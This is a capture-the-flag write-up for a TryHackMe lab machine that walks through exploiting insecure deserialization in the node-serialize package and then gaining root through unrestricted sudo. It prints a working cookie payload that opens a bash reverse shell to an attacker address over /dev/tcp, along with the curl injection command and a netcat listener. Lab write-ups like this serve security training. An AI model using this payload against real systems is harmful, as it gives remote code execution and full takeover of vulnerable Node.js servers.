# TryHackMe - Horror LLC (Node.js Deserialization)

**Machine Name:** Horror LLC  
**Category:** Web Exploitation / Node.js / Privilege Escalation  
**IP Address:** 10.80.140.189  

---

## 1. Enumeration

### Nmap Scan
I started with a standard `nmap` scan to identify open ports and services:
```bash
nmap -p- -sV -sC -Pn --min-rate 1000 10.80.140.189
```
**Findings:**
* **Port 22 (SSH):** OpenSSH 8.2p1.
* **Port 80 (HTTP):** Serving a webpage for "Horror LLC". The lack of standard server headers in the Nmap output suggested a custom, lightweight backend. The HTML source code explicitly stated: `Built with Nodejs`.

---

## 2. Web Application Analysis

### Analyzing the Frontend
The webpage contained an email signup form. Inspecting the source code revealed a highly suspicious JavaScript snippet handling the submission:
* It forced a `POST` request but passed the input as a URL query parameter (`?email=...`).
* It attempted to immediately delete a cookie named `session` by setting its expiration date in the past.
* It forced a page reload exactly 500ms after submission, making it difficult to intercept the response in a browser.

### Capturing the Session Cookie
To bypass the browser's JavaScript execution and see the raw server response, I used `curl`:
```bash
curl -i -s -X POST "[http://10.80.140.189/?email=hacker@test.com](http://10.80.140.189/?email=hacker@test.com)"
```
The HTTP headers revealed a Base64-encoded cookie being set by the server:
`Set-Cookie: session=eyJlbWFpbCI6ImhhY2tlckB0ZXN0LmNvbSJ9`

Decoding the cookie (`echo "..." | base64 -d`) revealed a serialized JSON object:
```json
{"email":"hacker@test.com"}
```

---

## 3. Exploitation

### Vulnerability Identification
Because the backend was Node.js and passed serialized JSON objects via cookies, I tested for **Insecure Deserialization** via the vulnerable `node-serialize` package (CVE-2017-5941). 

This vulnerability allows an attacker to execute arbitrary code by passing an Immediately Invoked Function Expression (IIFE) tagged with `_$$ND_FUNC$$_`.

### Achieving Remote Code Execution (RCE)
My initial test using `child_process.exec()` failed silently because Node.js is asynchronous. To force the server to execute the command and wait, I had to use the synchronous version: `execSync()`.

I crafted a payload to spawn a standard bash reverse shell back to my Kali machine (`192.168.214.156` on port `4444`):

**The Payload (JSON):**
```json
{"email":"_$$ND_FUNC$$_function(){ require(\"child_process\").execSync(\"bash -c \\\"bash -i >& /dev/tcp/192.168.214.156/4444 0>&1\\\"\"); }() "}
```

**The Execution:**
I set up a Netcat listener (`nc -lnvp 4444`), encoded the payload to Base64, and injected it into the `Cookie` header:
```bash
PAYLOAD=$(echo -n '{"email":"_$$ND_FUNC$$_function(){ require(\"child_process\").execSync(\"bash -c \\\"bash -i >& /dev/tcp/192.168.214.156/4444 0>&1\\\"\"); }() "}' | base64 -w 0)

curl -s [http://10.80.140.189/](http://10.80.140.189/) -H "Cookie: session=$PAYLOAD"
```
The `curl` command hung, and the reverse shell successfully connected. 

---

## 4. Post-Exploitation & Privilege Escalation

### Initial Access & Shell Stabilization
I landed on the box as the `ubuntu` user. I stabilized the dumb shell using Python:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Finding the User Flag
The user flag was not in the default `/home/ubuntu` directory. I used `find` to locate it system-wide:
```bash
find / -name "user.txt" 2>/dev/null
```
The flag was located at `/home/dylan/user.txt`.

### Privilege Escalation (Root)
I checked the `ubuntu` user's `sudo` privileges:
```bash
sudo -l
```
The output revealed `(ALL) NOPASSWD: ALL`, meaning the user could run any command as root without a password. 

I escalated to root instantly:
```bash
sudo su -
```
From there, I navigated to `/root` and read the final `root.txt` flag, fully compromising the machine.
